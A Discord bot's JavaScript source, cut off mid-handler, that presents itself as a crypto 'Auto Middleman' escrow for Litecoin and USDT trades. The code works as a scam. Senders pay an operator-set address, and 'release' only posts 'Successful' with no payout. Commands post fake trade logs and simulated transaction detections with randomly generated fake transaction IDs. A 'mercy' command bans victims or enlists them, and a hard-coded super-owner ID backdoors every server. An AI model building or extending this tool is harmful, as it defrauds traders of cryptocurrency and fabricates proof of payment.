const { MongoClient } = require('mongodb');
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType, ButtonBuilder, ButtonStyle, ActionRowBuilder, EmbedBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const express = require('express');
 
const mongoClient = new MongoClient(process.env.MONGODB_URI);
let db;
 
async function connectDB() {
  await mongoClient.connect();
  db = mongoClient.db('auto-mm-bot');
  console.log('Connected to MongoDB');
}
 
async function loadOwners(guildId) {
  try {
    const doc = await db.collection('owners').findOne({ _id: guildId });
    return new Set(doc ? doc.owners : []);
  } catch {
    return new Set();
  }
}
 
async function saveOwners(guildId) {
  try {
    await db.collection('owners').updateOne(
      { _id: guildId },
      { $set: { owners: [...(guildOwners[guildId] || new Set())] } },
      { upsert: true }
    );
  } catch (e) {
    console.log('Error saving owners:', e.message);
  }
}
 
async function loadConfig(guildId) {
  try {
    const doc = await db.collection('config').findOne({ _id: guildId });
    return doc || {};
  } catch {
    return {};
  }
}
 
async function saveConfig(guildId) {
  try {
    await db.collection('config').updateOne(
      { _id: guildId },
      { $set: guildConfig[guildId] },
      { upsert: true }
    );
  } catch (e) {
    console.log('Error saving config:', e.message);
  }
}
 
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});
 
const app = express();
app.use(express.json());
 
const SUPER_OWNER = 1472661189824872622n;
const guildOwners = {};
const guildConfig = {};
const userStats = {};
const rankRoles = {
  Quartz: { min: 500, roleId: null },
  Amethyst: { min: 1000, roleId: null },
  Azure: { min: 2500, roleId: null },
  Ruby: { min: 5000, roleId: null },
  Emerald: { min: 10000, roleId: null },
  Diamond: { min: 15000, roleId: null },
  Obsidian: { min: 25000, roleId: null }
};
let tickets = {};
 
function getConfig(guildId) {
  if (!guildConfig[guildId]) {
    guildConfig[guildId] = {
      TOS_CHANNEL_ID: 'YOUR_TOS_CHANNEL_ID',
      TICKET_CATEGORY_ID: 'YOUR_TICKET_CATEGORY_ID',
      LTC_ADDRESS: 'YOUR_LTC_ADDRESS',
      USDT_ADDRESS: 'YOUR_USDT_ADDRESS',
      SIMULATE_ROLE_ID: 'YOUR_SIMULATE_ROLE_ID',
      STATS_CHANNEL_ID: 'YOUR_STATS_CHANNEL_ID',
      BOT_NAME: "Jace's"
    };
  }
  return guildConfig[guildId];
}
 
function isOwner(guildId, userId) {
  return (guildOwners[guildId] || new Set()).has(userId) || BigInt(userId) === SUPER_OWNER;
}
 
async function ensureGuild(guildId) {
  if (!guildOwners[guildId]) {
    guildOwners[guildId] = await loadOwners(guildId);
  }
  if (!guildConfig[guildId]) {
    const cfg = await loadConfig(guildId);
    guildConfig[guildId] = {
      TOS_CHANNEL_ID: cfg.TOS_CHANNEL_ID || 'YOUR_TOS_CHANNEL_ID',
      TICKET_CATEGORY_ID: cfg.TICKET_CATEGORY_ID || 'YOUR_TICKET_CATEGORY_ID',
      LTC_ADDRESS: cfg.LTC_ADDRESS || 'YOUR_LTC_ADDRESS',
      USDT_ADDRESS: cfg.USDT_ADDRESS || 'YOUR_USDT_ADDRESS',
      SIMULATE_ROLE_ID: cfg.SIMULATE_ROLE_ID || 'YOUR_SIMULATE_ROLE_ID',
      STATS_CHANNEL_ID: cfg.STATS_CHANNEL_ID || 'YOUR_STATS_CHANNEL_ID',
      BOT_NAME: cfg.BOT_NAME || "Jace's"
    };
  }
}
 
async function getLTCPrice() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd');
    const data = await res.json();
    return data.litecoin.usd;
  } catch {
    return 53.20;
  }
}
 
function generateTXID() {
  const chars = '0123456789abcdef';
  let txid = '';
  for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * chars.length)];
  return txid;
}
 
function formatTXID(txid) {
  return `${txid.slice(0, 10)}...${txid.slice(-8)}`;
}
 
function getCurrentRank(usd) {
  const ranks = Object.entries(rankRoles).reverse();
  for (const [name, data] of ranks) {
    if (usd >= data.min) return name;
  }
  return null;
}
 
function getNextRank(usd) {
  const ranks = Object.entries(rankRoles);
  for (const [name, data] of ranks) {
    if (usd < data.min) return name;
  }
  return null;
}
 
async function updateRank(guild, userId) {
  try {
    const member = await guild.members.fetch(userId);
    const stats = userStats[userId] || { usd: 0, deals: 0 };
    for (const [name, data] of Object.entries(rankRoles)) {
      if (!data.roleId) continue;
      const role = guild.roles.cache.get(data.roleId);
      if (!role) continue;
      if (stats.usd >= data.min) {
        await member.roles.add(role);
      } else {
        await member.roles.remove(role);
      }
    }
  } catch (e) {
    console.log('Error updating rank:', e.message);
  }
}
 
client.on('ready', async () => {
  await connectDB();
  console.log(`Bot online as ${client.user.tag}`);
  const commands = [
    new SlashCommandBuilder().setName('setltcaddy').setDescription('Set LTC address').addStringOption(o => o.setName('address').setDescription('LTC Address').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('setusdtaddy').setDescription('Set USDT address').addStringOption(o => o.setName('address').setDescription('USDT Address').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('setbotname').setDescription('Set bot name').addStringOption(o => o.setName('name').setDescription('Name').setRequired(true)),
    new SlashCommandBuilder().setName('setcategory').setDescription('Set ticket category').addStringOption(o => o.setName('category_id').setDescription('Category ID').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('settoschannel').setDescription('Set TOS channel').addStringOption(o => o.setName('channel_id').setDescription('Channel ID').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('setsimulaterole').setDescription('Set role that can use simulate commands').addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('setowner').setDescription('Add an owner').addUserOption(o => o.setName('user').setDescription('User').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('removeowner').setDescription('Remove an owner').addUserOption(o => o.setName('user').setDescription('User').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('sendlogs').setDescription('Send a fake trade log').addChannelOption(o => o.setName('channel').setDescription('Channel').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('simulatedetection').setDescription('Simulate transaction detection').addNumberOption(o => o.setName('amount').setDescription('USD Amount').setRequired(true)),
    new SlashCommandBuilder().setName('mercy').setDescription('Give a user a chance').addUserOption(o => o.setName('user').setDescription('User').setRequired(true)),
    new SlashCommandBuilder().setName('simulateconfirmation').setDescription('Simulate transaction confirmation').addNumberOption(o => o.setName('amount').setDescription('USD Amount').setRequired(true)),
    new SlashCommandBuilder().setName('setstatschannel').setDescription('Set stats channel').addStringOption(o => o.setName('channel_id').setDescription('Channel ID').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('setrole').setDescription('Set rank role').addStringOption(o => o.setName('rank').setDescription('Rank name').setRequired(true).addChoices({ name: 'Quartz', value: 'Quartz' }, { name: 'Amethyst', value: 'Amethyst' }, { name: 'Azure', value: 'Azure' }, { name: 'Ruby', value: 'Ruby' }, { name: 'Emerald', value: 'Emerald' }, { name: 'Diamond', value: 'Diamond' }, { name: 'Obsidian', value: 'Obsidian' })).addRoleOption(o => o.setName('role').setDescription('Role').setRequired(true)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder().setName('stats').setDescription('View your stats').addUserOption(o => o.setName('user').setDescription('User').setRequired(false)),
    new SlashCommandBuilder().setName('setstats').setDescription('Edit user stats').addUserOption(o => o.setName('user').setDescription('User').setRequired(true)).addNumberOption(o => o.setName('usd').setDescription('Total USD Value').setRequired(false)).addIntegerOption(o => o.setName('deals').setDescription('Deals Completed').setRequired(false)).setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
  ].map(cmd => cmd.toJSON());
  const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
});
 
client.on('messageCreate', async (message) => {
  if (!message.guild) return;
  const guildId = message.guild.id;
  await ensureGuild(guildId);
  const cfg = getConfig(guildId);
 
  if (message.content.startsWith('!steal')) {
    if (!isOwner(guildId, message.author.id)) return;
    const args = message.content.split(' ');
    const emojiArg = args[1];
    if (!emojiArg) return message.reply('Please provide an emoji!');
    const match = emojiArg.match(/<a?:(\w+):(\d+)>/);
    if (!match) return message.reply('Please provide a valid custom emoji!');
    const name = match[1];
    const id = match[2];
    const animated = emojiArg.startsWith('<a:');
    const url = `https://cdn.discordapp.com/emojis/${id}.${animated ? 'gif' : 'png'}`;
    try {
      const emoji = await message.guild.emojis.create({ attachment: url, name: name });
      await message.reply(`Emoji added: ${emoji}`);
    } catch (e) {
      await message.reply(`Error: ${e.message}`);
    }
  }
 
  if (message.content === '!panel') {
    if (!isOwner(guildId, message.author.id)) return;
    const mainEmbed = new EmbedBuilder().setDescription(`# ${cfg.BOT_NAME} Auto Middleman\n• **Paid Service**\n• Read our ToS before using the bot: <#${cfg.TOS_CHANNEL_ID}>`).setColor(0x2b2d31);
    const feesEmbed = new EmbedBuilder().setTitle('**Fees:**').setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**').setColor(0x2b2d31);
    const ltcEmbed = new EmbedBuilder().setTitle('<:LTC:1507672593145139230> • **Request Litecoin** • <:LTC:1507672593145139230>').setColor(0x345ca3);
    const usdtEmbed = new EmbedBuilder().setTitle('<:usdt:1507676670654419064> • **Request USDT [BEP-20]** • <:usdt:1507676670654419064>').setDescription('• Network: **BSC (BEP-20)**').setColor(0x26a17b);
    const tutorialButton = new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://www.youtube.com/watch?v=XIkpcT2WNPI').setEmoji('🔗');
    const ltcButton = new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji({ id: '1507672593145139230', name: 'LTC' });
    const usdtButton = new ButtonBuilder().setCustomId('request_usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji({ id: '1507676670654419064', name: 'usdt' });
    const row1 = new ActionRowBuilder().addComponents(tutorialButton);
    const row2 = new ActionRowBuilder().addComponents(ltcButton);
    const row3 = new ActionRowBuilder().addComponents(usdtButton);
    await message.channel.send({ embeds: [mainEmbed], components: [row1] });
    await message.channel.send({ embeds: [feesEmbed] });
    await message.channel.send({ embeds: [ltcEmbed], components: [row2] });
    await message.channel.send({ embeds: [usdtEmbed], components: [row3] });
    await message.delete().catch(() => {});
  }
});
 
client.on('interactionCreate', async (interaction) => {
  try {
    const guildId = interaction.guildId;
    await ensureGuild(guildId);
    const cfg = getConfig(guildId);
 
    if (interaction.isButton()) {
      if (interaction.customId === 'request_ltc' || interaction.customId === 'request_usdt') {
        const currency = interaction.customId === 'request_ltc' ? 'LTC' : 'USDT';
        const modal = new ModalBuilder().setCustomId(`request_modal_${currency}`).setTitle('Fill out the format');
        const traderInput = new TextInputBuilder().setCustomId('trader_id').setLabel("Paste Your Trader's Username or ID").setPlaceholder('e.g.: kookie.js / 133101227415175174').setStyle(TextInputStyle.Short).setRequired(true);
        const givingInput = new TextInputBuilder().setCustomId('giving').setLabel('What are You giving?').setStyle(TextInputStyle.Paragraph).setMaxLength(500).setRequired(true);
        const traderGivingInput = new TextInputBuilder().setCustomId('trader_giving').setLabel('What is Your Trader giving?').setStyle(TextInputStyle.Paragraph).setMaxLength(500).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(traderInput), new ActionRowBuilder().addComponents(givingInput), new ActionRowBuilder().addComponents(traderGivingInput));
        await interaction.showModal(modal);
      }
      if (interaction.customId === 'delete_ticket') {
        if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
        await interaction.reply({ content: 'Deleting ticket...', ephemeral: true });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 2000);
      }
      if (interaction.customId.startsWith('role_sender_') || interaction.customId.startsWith('role_receiver_') || interaction.customId.startsWith('role_reset_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (![ticket.trader1, ticket.trader2].includes(interaction.user.id)) return interaction.reply({ content: 'You are not part of this trade.', ephemeral: true });
        if (interaction.customId.startsWith('role_reset_')) {
          if (ticket.trader1 === interaction.user.id) ticket.sender = null;
          else ticket.receiver = null;
        } else if (interaction.customId.startsWith('role_sender_')) {
          ticket.sender = interaction.user.id;
        } else {
          ticket.receiver = interaction.user.id;
        }
        const roleEmbed = new EmbedBuilder().setTitle('🛡️ • Select your role').setDescription('"**Sender**" if you are __Sending__ LTC to the bot.\n"**Receiver**" if you are __Receiving__ LTC *later* from the bot.\n\n**Sender**\n' + (ticket.sender ? `<@${ticket.sender}>` : '...') + '\n**Receiver**\n' + (ticket.receiver ? `<@${ticket.receiver}>` : '...')).setColor(0x2b2d31);
        const senderBtn = new ButtonBuilder().setCustomId(`role_sender_${ticketId}`).setLabel('Sender').setStyle(ButtonStyle.Primary);
        const receiverBtn = new ButtonBuilder().setCustomId(`role_receiver_${ticketId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary);
        const resetBtn = new ButtonBuilder().setCustomId(`role_reset_${ticketId}`).setLabel('Reset').setStyle(ButtonStyle.Danger);
        const row = new ActionRowBuilder().addComponents(senderBtn, receiverBtn, resetBtn);
        await interaction.update({ embeds: [roleEmbed], components: [row] });
        if (ticket.sender && ticket.receiver && ticket.sender !== ticket.receiver) {
          const confirmEmbed = new EmbedBuilder().setTitle('<a:loading:1507682188228034586> • Is This Information Correct?').setDescription(`**Sender**\n<@${ticket.sender}>\n**Receiver**\n<@${ticket.receiver}>\n\nMake sure you have selected the right role! If you didn't then click "Incorrect"`).setColor(0x2b2d31);
          const correctBtn = new ButtonBuilder().setCustomId(`confirm_roles_correct_${ticketId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success);
          const incorrectBtn = new ButtonBuilder().setCustomId(`confirm_roles_incorrect_${ticketId}`).setLabel('✖ Incorrect').setStyle(ButtonStyle.Danger);
          const confirmRow = new ActionRowBuilder().addComponents(correctBtn, incorrectBtn);
          ticket.rolesConfirmed = { trader1: false, trader2: false };
          await interaction.channel.send({ content: `<@${ticket.trader1}> <@${ticket.trader2}>`, embeds: [confirmEmbed], components: [confirmRow] });
        }
      }
      if (interaction.customId.startsWith('confirm_roles_correct_') || interaction.customId.startsWith('confirm_roles_incorrect_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (![ticket.trader1, ticket.trader2].includes(interaction.user.id)) return interaction.reply({ content: 'You are not part of this trade.', ephemeral: true });
        if (interaction.customId.startsWith('confirm_roles_incorrect_')) {
          ticket.sender = null; ticket.receiver = null; ticket.rolesConfirmed = null;
          return interaction.reply({ content: 'Roles reset. Please select again.', ephemeral: true });
        }
        const key = ticket.trader1 === interaction.user.id ? 'trader1' : 'trader2';
        if (ticket.rolesConfirmed[key]) return interaction.reply({ content: 'You already confirmed.', ephemeral: true });
        ticket.rolesConfirmed[key] = true;
        await interaction.reply({ content: `✅ <@${interaction.user.id}> clicked Correct.` });
        if (ticket.rolesConfirmed.trader1 && ticket.rolesConfirmed.trader2) {
          const usdEmbed = new EmbedBuilder().setTitle('💵 • Set the amount in USD value').setColor(0x2b2d31);
          const setUsdBtn = new ButtonBuilder().setCustomId(`set_usd_${ticketId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary);
          const usdRow = new ActionRowBuilder().addComponents(setUsdBtn);
          await interaction.channel.send({ content: `<@${ticket.sender}>`, embeds: [usdEmbed], components: [usdRow] });
        }
      }
      if (interaction.customId.startsWith('set_usd_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (interaction.user.id !== ticket.sender) return interaction.reply({ content: 'Only the sender can set the USD amount.', ephemeral: true });
        const modal = new ModalBuilder().setCustomId(`usd_modal_${ticketId}`).setTitle('Set USD Amount');
        const usdInput = new TextInputBuilder().setCustomId('usd_amount').setLabel('Please state the amount in USD value').setPlaceholder('e.g.: 435.20').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(usdInput));
        await interaction.showModal(modal);
      }
      if (interaction.customId.startsWith('confirm_usd_correct_') || interaction.customId.startsWith('confirm_usd_incorrect_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (![ticket.trader1, ticket.trader2].includes(interaction.user.id)) return interaction.reply({ content: 'You are not part of this trade.', ephemeral: true });
        if (interaction.customId.startsWith('confirm_usd_incorrect_')) {
          ticket.usdAmount = null; ticket.usdConfirmed = null;
          return interaction.reply({ content: 'USD amount reset. Please set again.', ephemeral: true });
        }
        const key = ticket.trader1 === interaction.user.id ? 'trader1' : 'trader2';
        if (ticket.usdConfirmed[key]) return interaction.reply({ content: 'You already confirmed.', ephemeral: true });
        ticket.usdConfirmed[key] = true;
        await interaction.reply({ content: `✅ <@${interaction.user.id}> confirmed the USD amount.` });
        if (ticket.usdConfirmed.trader1 && ticket.usdConfirmed.trader2) {
          const ltcPrice = await getLTCPrice();
          const ltcAmount = (ticket.usdAmount / ltcPrice).toFixed(8);
          ticket.ltcAmount = ltcAmount; ticket.copyUsed = false;
          const address = ticket.currency === 'LTC' ? cfg.LTC_ADDRESS : cfg.USDT_ADDRESS;
          const paymentEmbed = new EmbedBuilder().setTitle('📜 • Payment Information').setDescription(`Make sure to send the **EXACT** amount in LTC.\n\n**USD Amount**\n\`$${ticket.usdAmount}\`\n🔘 **LTC Amount**\n\`${ltcAmount}\`\n**Payment Address**\n\`\`\`${address}\`\`\`\nCurrent LTC Price: $${ltcPrice}\nThis ticket will be closed within 20 minutes if no transaction was detected.`).setColor(0x2b2d31);
          const copyBtn = new ButtonBuilder().setCustomId(`copy_details_${ticketId}`).setLabel('Copy Details').setStyle(ButtonStyle.Primary);
          const copyRow = new ActionRowBuilder().addComponents(copyBtn);
          await interaction.channel.send({ content: `<@${ticket.sender}> Send the LTC to the following address.`, embeds: [paymentEmbed], components: [copyRow] });
        }
      }
      if (interaction.customId.startsWith('copy_details_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (ticket.copyUsed) return interaction.reply({ content: 'This button has already been used.', ephemeral: true });
        ticket.copyUsed = true;
        const address = ticket.currency === 'LTC' ? cfg.LTC_ADDRESS : cfg.USDT_ADDRESS;
        await interaction.reply({ content: `${address}\n${ticket.ltcAmount}` });
      }
      if (interaction.customId.startsWith('release_') && !interaction.customId.startsWith('release_confirm_') && !interaction.customId.startsWith('release_back_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (interaction.user.id !== ticket.sender) return interaction.reply({ content: 'Only the sender can release.', ephemeral: true });
        const releaseConfirmEmbed = new EmbedBuilder().setTitle('⚠️ Are you sure you want to release the LTC? ⚠️').setDescription(`Clicking **"Confirm"** will give your trader permission to withdraw the LTC.\n<@${ticket.receiver}> will get the LTC.\n\n**Staff will never ask you to release/cancel**`).setColor(0xffa500);
        const confirmBtn = new ButtonBuilder().setCustomId(`release_confirm_${ticketId}`).setLabel('Confirm').setStyle(ButtonStyle.Success);
        const backBtn = new ButtonBuilder().setCustomId(`release_back_${ticketId}`).setLabel('Back').setStyle(ButtonStyle.Secondary);
        const row = new ActionRowBuilder().addComponents(confirmBtn, backBtn);
        await interaction.update({ embeds: [releaseConfirmEmbed], components: [row] });
      }
      if (interaction.customId.startsWith('release_back_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        const proceedEmbed = new EmbedBuilder().setTitle('✅ • You may proceed with your trade.').setDescription(`1. <@${ticket.receiver}> **Give your trader the items or payment you agreed on.**\n\n2. <@${ticket.sender}> **Once you have received your items, click "Release" so your trader can claim the LTC.**`).setColor(0x00aa00);
        const releaseBtn = new ButtonBuilder().setCustomId(`release_${ticketId}`).setLabel('Release').setStyle(ButtonStyle.Success);
        const cancelBtn = new ButtonBuilder().setCustomId(`cancel_${ticketId}`).setLabel('Cancel').setStyle(ButtonStyle.Secondary);
        const row = new ActionRowBuilder().addComponents(releaseBtn, cancelBtn);
        await interaction.update({ embeds: [proceedEmbed], components: [row] });
      }
      if (interaction.customId.startsWith('release_confirm_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        if (ticket) {
          if (!userStats[ticket.sender]) userStats[ticket.sender] = { usd: 0, deals: 0 };
          if (!userStats[ticket.receiver]) userStats[ticket.receiver] = { usd: 0, deals: 0 };
          userStats[ticket.sender].usd += ticket.usdAmount; userStats[ticket.sender].deals += 1;
          userStats[ticket.receiver].usd += ticket.usdAmount; userStats[ticket.receiver].deals += 1;
          await updateRank(interaction.guild, ticket.sender);
          await updateRank(interaction.guild, ticket.receiver);
        }
        const finalEmbed = new EmbedBuilder().setTitle('W').setDescription('Successful.').setColor(0x00aa00);
        await interaction.reply({ embeds: [finalEmbed], components: [] });
      }
      if (interaction.customId.startsWith('cancel_')) {
        if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
        await interaction.reply({ content: 'Trade cancelled.', ephemeral: true });
      }
      if (interaction.customId.startsWith('mercy_accept_')) {
        const userId = interaction.customId.replace('mercy_accept_', '');
        const member = await interaction.guild.members.fetch(userId);
        const role = interaction.guild.roles.cache.get(cfg.SIMULATE_ROLE_ID);
        if (!role) return interaction.update({ content: 'Role not configured.', embeds: [], components: [] });
        await member.roles.add(role);
        await interaction.update({ content: `✅ <@${userId}> has been accepted.`, embeds: [], components: [] });
      }
      if (interaction.customId.startsWith('mercy_decline_')) {
        const userId = interaction.customId.replace('mercy_decline_', '');
        const member = await interaction.guild.members.fetch(userId);
        await member.ban({ reason: 'Mercy declined' });
        await interaction.update({ content: `🔨 <@${userId}> has been banned.`, embeds: [], components: [] });
      }
    }
 
    if (interaction.isModalSubmit()) {
      if (interaction.customId.startsWith('request_modal_')) {
        const currency = interaction.customId.replace('request_modal_', '');
        const traderInput = interaction.fields.getTextInputValue('trader_id');
        const giving = interaction.fields.getTextInputValue('giving');
        const traderGiving = interaction.fields.getTextInputValue('trader_giving');
        let trader2 = null;
        try {
          if (/^\d{17,19}$/.test(traderInput)) {
            trader2 = await client.users.fetch(traderInput);
          } else {
            const members = await interaction.guild.members.fetch();
            trader2 = members.find(m => m.user.username === traderInput || m.displayName === traderInput)?.user;
          }
        } catch {}
        if (!trader2) return interaction.reply({ content: 'Could not find the trader. Please use their Discord ID.', ephemeral: true });
        const ticketName = `${currency.toLowerCase()}-${interaction.user.username}_${Math.floor(Math.random() * 90000) + 10000}-${Math.floor(Math.random() * 900000) + 100000}`;
        let channel;
        try {
          channel = await interaction.guild.channels.create({
            name: ticketName, type: ChannelType.GuildText, parent: cfg.TICKET_CATEGORY_ID,
            permissionOverwrites: [
              { id: interaction.guild.id, deny: ['ViewChannel'] },
              { id: interaction.user.id, allow: ['ViewChannel', 'SendMessages'] },
              { id: trader2.id, allow: ['ViewChannel', 'SendMessages'] },
              { id: client.user.id, allow: ['ViewChannel', 'SendMessages', 'ManageChannels'] }
            ]
          });
        } catch (e) {
          return interaction.reply({ content: 'Ticket category not configured. Please contact an admin.', ephemeral: true });
        }
        tickets[channel.id] = { trader1: interaction.user.id, trader2: trader2.id, giving1: giving, giving2: traderGiving, sender: null, receiver: null, usdAmount: null, ltcAmount: null, currency: currency, copyUsed: false, rolesConfirmed: null, usdConfirmed: null, txid: null };
        await interaction.reply({ content: `Ticket Created! -> ${channel}`, ephemeral: true });
        const ticketEmbed = new EmbedBuilder().setTitle(`👋 ${cfg.BOT_NAME} Auto Middleman Service`).setDescription(`Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.\nBy using this bot, you agree to our ToS <#${cfg.TOS_CHANNEL_ID}>.`).addFields({ name: `<@${interaction.user.id}>'s side:`, value: `\`\`${giving}\`\``, inline: true }, { name: `<@${trader2.id}>'s side:`, value: `\`\`${traderGiving}\`\``, inline: true }).setColor(0xf5deb3);
        const deleteBtn = new ButtonBuilder().setCustomId('delete_ticket').setLabel('✖ Delete Ticket').setStyle(ButtonStyle.Danger);
        const deleteRow = new ActionRowBuilder().addComponents(deleteBtn);
        await channel.send({ content: `<@${interaction.user.id}> <@${trader2.id}>`, embeds: [ticketEmbed], components: [deleteRow] });
        const roleEmbed = new EmbedBuilder().setTitle('🛡️ • Select your role').setDescription('"**Sender**" if you are __Sending__ LTC to the bot.\n"**Receiver**" if you are __Receiving__ LTC *later* from the bot.\n\n**Sender**\n...\n**Receiver**\n...').setColor(0x2b2d31);
        const senderBtn = new ButtonBuilder().setCustomId(`role_sender_${channel.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary);
        const receiverBtn = new ButtonBuilder().setCustomId(`role_receiver_${channel.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary);
        const resetBtn = new ButtonBuilder().setCustomId(`role_reset_${channel.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger);
        const roleRow = new ActionRowBuilder().addComponents(senderBtn, receiverBtn, resetBtn);
        await channel.send({ embeds: [roleEmbed], components: [roleRow] });
      }
      if (interaction.customId.startsWith('usd_modal_')) {
        const ticketId = interaction.channel.id;
        const ticket = tickets[ticketId];
        if (!ticket) return;
        const usdAmount = parseFloat(interaction.fields.getTextInputValue('usd_amount'));
        if (isNaN(usdAmount)) return interaction.reply({ content: 'Invalid amount.', ephemeral: true });
        ticket.usdAmount = usdAmount;
        ticket.usdConfirmed = { trader1: false, trader2: false };
        const usdConfirmEmbed = new EmbedBuilder().setTitle('<a:loading:1507682188228034586> • USD amount set to').setDescription(`\`$${usdAmount.toFixed(2)}\`\nPlease confirm the USD amount.`).setColor(0x2b2d31);
        const correctBtn = new ButtonBuilder().setCustomId(`confirm_usd_correct_${ticketId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success);
        const incorrectBtn = new ButtonBuilder().setCustomId(`confirm_usd_incorrect_${ticketId}`).setLabel('✖ Incorrect').setStyle(ButtonStyle.Danger);
        const row = new ActionRowBuilder().addComponents(correctBtn, incorrectBtn);
        await interaction.reply({ content: `<@${ticket.trader1}> <@${ticket.trader2}>`, embeds: [usdConfirmEmbed], components: [row] });
      }
    }
 
    if (!interaction.isChatInputCommand()) return;
 
    if (interaction.commandName === 'setltcaddy') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.LTC_ADDRESS = interaction.options.getString('address');
      await saveConfig(guildId);
      await interaction.reply({ content: `LTC address set to: ${cfg.LTC_ADDRESS}`, ephemeral: true });
    }
    if (interaction.commandName === 'setbotname') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.BOT_NAME = interaction.options.getString('name');
      await saveConfig(guildId);
      await interaction.reply({ content: `Bot name set to: ${cfg.BOT_NAME}`, ephemeral: true });
    }
    if (interaction.commandName === 'mercy') {
      const member = await interaction.guild.members.fetch(interaction.user.id);
      if (!member.roles.cache.has(cfg.SIMULATE_ROLE_ID) && BigInt(interaction.user.id) !== SUPER_OWNER) return interaction.reply({ content: 'You are not authorized.', ephemeral: true });
      const user = interaction.options.getUser('user');
      const mercyEmbed = new EmbedBuilder().setTitle('tung tung').setDescription('tung tung').setColor(0x2b2d31);
      const acceptBtn = new ButtonBuilder().setCustomId(`mercy_accept_${user.id}`).setLabel('Accept').setStyle(ButtonStyle.Success);
      const declineBtn = new ButtonBuilder().setCustomId(`mercy_decline_${user.id}`).setLabel('Decline').setStyle(ButtonStyle.Danger);
      const row = new ActionRowBuilder().addComponents(acceptBtn, declineBtn);
      await interaction.reply({ embeds: [mercyEmbed], components: [row] });
    }
    if (interaction.commandName === 'setusdtaddy') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.USDT_ADDRESS = interaction.options.getString('address');
      await saveConfig(guildId);
      await interaction.reply({ content: `USDT address set to: ${cfg.USDT_ADDRESS}`, ephemeral: true });
    }
    if (interaction.commandName === 'setcategory') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.TICKET_CATEGORY_ID = interaction.options.getString('category_id');
      await saveConfig(guildId);
      await interaction.reply({ content: `Category set to: ${cfg.TICKET_CATEGORY_ID}`, ephemeral: true });
    }
    if (interaction.commandName === 'setstatschannel') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      cfg.STATS_CHANNEL_ID = interaction.options.getString('channel_id');
      await saveConfig(guildId);
      await interaction.reply({ content: `Stats channel set!`, ephemeral: true });
    }
    if (interaction.commandName === 'setrole') {
      if (!isOwner(guildId, interaction.user.id)) return interaction.reply({ content: 'Not authorized.', ephemeral: true });
      const rank = interaction.options.getString('rank');
      const role = interaction.options.getRole('role');
      rankRoles[rank].roleId = role.id;
      await interaction.reply({ content: `${rank} role set to ${role}!`, ephemeral: true });
    }
    if (interaction.commandName === 'setstats') {
